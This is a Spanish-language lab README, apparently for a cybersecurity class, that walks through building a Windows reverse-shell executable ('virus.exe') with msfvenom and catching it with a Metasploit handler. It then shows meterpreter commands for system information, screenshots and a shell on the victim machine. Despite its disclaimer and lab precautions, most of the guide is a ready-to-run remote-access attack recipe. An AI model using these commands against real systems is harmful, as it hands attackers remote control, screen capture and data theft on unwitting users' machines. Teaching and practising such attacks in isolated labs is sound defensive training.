# ✅ **Payload malicioso en Windows 10 con Metasploit**
______________________________________
## ⚠️ **Aviso Legal / Disclaimer**
Este ejercicio se realiza únicamente con fines educativos y de aprendizaje en un entorno controlado y autorizado.
No debe utilizarse en redes, sistemas o equipos fuera del laboratorio sin el consentimiento explícito del propietario.
El uso indebido de estas técnicas en contextos reales puede ser ilegal y tener consecuencias legales graves.
Como estudiantes y profesionales de la ciberseguridad, debemos actuar siempre de forma ética y responsable.
________________________________________
Aclaración: Este método no necesita que Windows 10 sea vulnerable. Simplemente simula lo que pasaría si un usuario hace clic en un archivo malicioso, como ocurre con malware real.
______________________________________
## 🧰 **Requisitos del entorno de laboratorio**
- 💻 [Kali Linux (máquina atacante).](https://www.kali.org/get-kali/#kali-platforms)
-	🧱 [Máquina víctima: Windows 10  sin parches adicionales de seguridad, si es posible.](https://archive.org/details/windows-10-original)
-	Ambas máquinas en la misma red (virtual o real)
-	Desactivar antivirus y firewall en Windows 10 (solo para pruebas)
________________________________________
## 🧪 **PASO A PASO: Payload con Metasploit en Windows 10**
________________________________________
**🔹1. Crear el archivo malicioso con msfvenom**
<pre> msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o virus.exe </pre>
-	**LHOST:** [IP_de_Kali]
-	**LPORT:** el puerto por donde escucharás
-	**-f exe:** formato ejecutable de Windows
- **-o:** nombre del archivo
________________________________________
**🔹 2. Iniciar Metasploit**
<pre>msfconsole</pre>
________________________________________
**🔹 3. Configurar el listener (handler)**
<pre> use exploit/multi/handler </pre>
<pre> set PAYLOAD windows/meterpreter/reverse_tcp </pre>
<pre> set LHOST [IP_PC_CON_KALI] </pre>
<pre> set LPORT 4444 </pre>
<pre> exploit </pre>
________________________________________
**🔹 4. Enviar o ejecutar el archivo en Windows 10**
-	Copia el archivo **virus.exe** a la máquina Windows (por red compartida, USB, etc.).
-	Ejecuta el archivo manualmente (como si un usuario lo abriera por accidente).
________________________________________
**🔹 5. Resultado esperado**
En Kali deberías ver algo como:
```bash
[*] Meterpreter session 1 opened
```

Ahora puedes interactuar con la víctima:
```bash
meterpreter > sysinfo
meterpreter > screenshot
meterpreter > shell
```
________________________________________
## ⚠️ Precauciones para clase
- No conectar las máquinas a Internet.
-	Ejecutarlo en máquinas virtuales cerradas y restaurables.
-	Dejar en claro que esto no explota una falla del sistema, sino que aprovecha un descuido del usuario (ingeniería social).
________________________________________
## 📚 ¿Qué se enseña con este exploit?
-	Cómo se usa Metasploit en la práctica.
-	Cómo un atacante puede obtener acceso con un simple ejecutable.
-	La importancia de no ejecutar archivos desconocidos.
-	Cómo funciona una shell reversa (reverse shell).
________________________________________
## 🧑‍🏫 Autor

Explicación elaborada por [Sebastian Peinador](https://www.linkedin.com/in/sebastian-j-peinador/) para propósitos didácticos y de investigación en ciberseguridad ofensiva.
________________________________________
## 📄 Licencia

Este material se distribuye bajo la licencia [MIT](LICENSE).
________________________________________

> Si te resulta útil, ¡no olvides darle ⭐ al repo o compartirlo!	
